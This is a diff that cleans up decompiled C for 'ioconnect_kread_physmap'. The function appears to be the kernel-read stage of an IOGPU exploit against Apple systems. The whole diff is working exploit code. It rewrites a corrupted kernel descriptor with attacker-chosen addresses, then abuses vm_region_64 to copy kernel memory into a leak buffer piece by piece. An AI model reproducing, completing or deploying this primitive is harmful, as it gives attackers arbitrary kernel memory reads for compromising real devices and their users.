@@ -6599,116 +6599,83 @@ LABEL_547:
 //----- (000000000000F860) ----------------------------------------------------
 __int64 __fastcall ioconnect_kread_physmap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, unsigned int a4)
 {
-  __int64 result; // x0
-  __int64 v6; // x23
-  uint64_t *v7; // x24
-  __int64 v8; // x19
-  unsigned __int64 v9; // x26
-  unsigned __int64 v10; // x27
-  vm_size_t v11; // x8
-  vm_address_t v12; // x20
-  __int64 v13; // x28
-  __int64 v14; // x9
-  unsigned __int64 v15; // x22
-  unsigned __int64 v16; // x21
-  unsigned __int64 v17; // x25
-  size_t v19; // x22
-  kern_return_t v20; // w0
-  vm_address_t v21; // [xsp+0h] [xbp-F0h]
-  //__int64 v22; // [xsp+8h] [xbp-E8h]
-  __int64 v23; // [xsp+10h] [xbp-E0h]
-  unsigned __int64 v24; // [xsp+18h] [xbp-D8h]
-  __int64 v26; // [xsp+28h] [xbp-C8h]
-  __int64 v27; // [xsp+30h] [xbp-C0h]
-  __int64 v28; // [xsp+38h] [xbp-B8h]
+  uint64_t iogpuCtx; // x23
+  uint64_t *descriptor; // x24
+  uint64_t *state; // x19
+  unsigned __int64 copied; // x26
+  unsigned __int64 remaining; // x27
+  vm_size_t pageSize; // x8
+  vm_address_t fakeRegionBase; // x20
+  __int64 queryAddr; // x28
+  size_t chunkSize; // x22
+  kern_return_t kr; // w0
+  __int64 originalDescriptorWord1; // [xsp+28h] [xbp-C8h]
+  __int64 originalDescriptorWord3; // [xsp+30h] [xbp-C0h]
+  __int64 savedStateWord1; // [xsp+38h] [xbp-B8h]
   mach_port_t object_name; // [xsp+40h] [xbp-B0h] BYREF
   mach_msg_type_number_t infoCnt; // [xsp+44h] [xbp-ACh] BYREF
   int info[9]; // [xsp+48h] [xbp-A8h] BYREF
-  __int16 v32; // [xsp+68h] [xbp-88h]
   vm_size_t size; // [xsp+70h] [xbp-80h] BYREF
   vm_address_t address; // [xsp+78h] [xbp-78h] BYREF
-  uint64_t __src[2]; // [xsp+80h] [xbp-70h] BYREF
+  uint64_t leakBuf[2]; // [xsp+80h] [xbp-70h] BYREF
 
-  result = 708642;
-  v6 = krwCtx->iogpuCtx;
-  if ( !v6 )
+  iogpuCtx = krwCtx->iogpuCtx;
+  if ( !iogpuCtx )
     return 708609;
-  v7 = *(uint64_t **)(v6 + 13384);
-  v8 = *(uint64_t *)(v6 + 13400);
-  if ( *(uint64_t *)(v8 + 24) == v7[2] && *(uint64_t *)(v8 + 8) == *(uint64_t *)(v6 + 13392) && *v7 == *(uint64_t *)(v6 + 13408) )
+  descriptor = *(uint64_t **)(iogpuCtx + 13384);
+  state = *(uint64_t **)(iogpuCtx + 13400);
+  if ( state[3] != descriptor[2] || state[1] != *(uint64_t *)(iogpuCtx + 13392) || descriptor[0] != *(uint64_t *)(iogpuCtx + 13408) )
+    return 708642;
+
+  if ( !a4 )
+    return 0;
+
+  savedStateWord1 = *(uint64_t *)(iogpuCtx + 13392);
+  copied = 0;
+  remaining = a4;
+  pageSize = vm_page_size;
+  fakeRegionBase = descriptor[3] - vm_page_size;
+  while ( 1 )
   {
-    if ( !a4 )
-      return 0;
-    v28 = *(uint64_t *)(v6 + 13392);
-    v9 = 0;
-    v10 = a4;
-    v11 = vm_page_size;
-    v12 = v7[3] - vm_page_size;
-    v23 = a2;
-    v24 = a4;
-    v21 = v12;
-    //v22 = a1;
-    while ( 1 )
+    queryAddr = a2 + copied;
+    unsigned __int64 pageOffset = krwCtx->pageMask & queryAddr;
+    bool queryAddressPair = pageOffset + 64 <= krwCtx->pageSizeOrSomething
+                         || pageOffset + remaining > krwCtx->pageSizeOrSomething;
+    address = fakeRegionBase;
+    infoCnt = 9;
+    state[1] = descriptor[1];
+    madvise(*(void **)(iogpuCtx + 11296), 2 * pageSize, 2);
+    originalDescriptorWord1 = descriptor[1];
+    originalDescriptorWord3 = descriptor[3];
+    descriptor[1] = queryAddressPair ? queryAddr - 16 : queryAddr - 78;
+    descriptor[3] = fakeRegionBase;
+    kr = vm_region_64(mach_task_self_, &address, &size, 9, info, &infoCnt, &object_name);
+    descriptor[1] = originalDescriptorWord1;
+    descriptor[3] = originalDescriptorWord3;
+    state[1] = savedStateWord1;
+    ++*(uint64_t *)(iogpuCtx + 13416);
+    if ( kr )
+      return kr | 0x80000000;
+
+    if ( queryAddressPair )
     {
-      v13 = v9 + a2;
-      v14 = krwCtx->pageMask & (v9 + a2);
-      v15 = v14 + 64;
-      v16 = krwCtx->pageSizeOrSomething;
-      v17 = v14 + v10;
-      address = v12;
-      infoCnt = 9;
-      *(uint64_t *)(v8 + 8) = v7[1];
-      madvise(*(void **)(v6 + 11296), 2 * v11, 2);
-      v26 = v7[1];
-      v27 = v7[3];
-      if ( v15 <= v16 || v17 > v16 )
-      {
-        v7[1] = v13 - 16;
-        v7[3] = v12;
-        v20 = vm_region_64(mach_task_self_, &address, &size, 9, info, &infoCnt, &object_name);
-        v7[1] = v26;
-        v7[3] = v27;
-        *(uint64_t *)(v8 + 8) = v28;
-        ++*(uint64_t *)(v6 + 13416);
-        if ( v20 )
-          return v20 | 0x80000000;
-        if ( v10 >= 0x10 )
-          v19 = 16;
-        else
-          v19 = v10;
-        __src[0] = address;
-        __src[1] = size + address;
-      }
-      else
-      {
-        v7[1] = v13 - 78;
-        v7[3] = v12;
-        v20 = vm_region_64(mach_task_self_, &address, &size, 9, info, &infoCnt, &object_name);
-        v7[1] = v26;
-        v7[3] = v27;
-        *(uint64_t *)(v8 + 8) = v28;
-        ++*(uint64_t *)(v6 + 13416);
-        if ( v20 )
-          return v20 | 0x80000000;
-        if ( v10 >= 2 )
-          v19 = 2;
-        else
-          v19 = v10;
-        LOWORD(__src[0]) = *(uint16_t *)&info[8];
-      }
-      memcpy((void *)(a3 + v9), __src, v19);
-      v9 += v19;
-      if ( v9 >= v24 )
-        return 0;
-      v10 -= v19;
-      v28 = *(uint64_t *)(v8 + 8);
-      v11 = vm_page_size;
-      //a1 = v22;
-      a2 = v23;
-      v12 = v21;
+      chunkSize = remaining >= 0x10 ? 0x10 : remaining;
+      leakBuf[0] = address;
+      leakBuf[1] = size + address;
     }
+    else
+    {
+      chunkSize = remaining >= 2 ? 2 : remaining;
+      LOWORD(leakBuf[0]) = *(uint16_t *)&info[8];
+    }
+    memcpy((void *)(a3 + copied), leakBuf, chunkSize);
+    copied += chunkSize;
+    if ( copied >= a4 )
+      return 0;
+    remaining -= chunkSize;
+    savedStateWord1 = state[1];
+    pageSize = vm_page_size;
   }
-  return result;
 }
 
 //----- (000000000000FAE4) ----------------------------------------------------
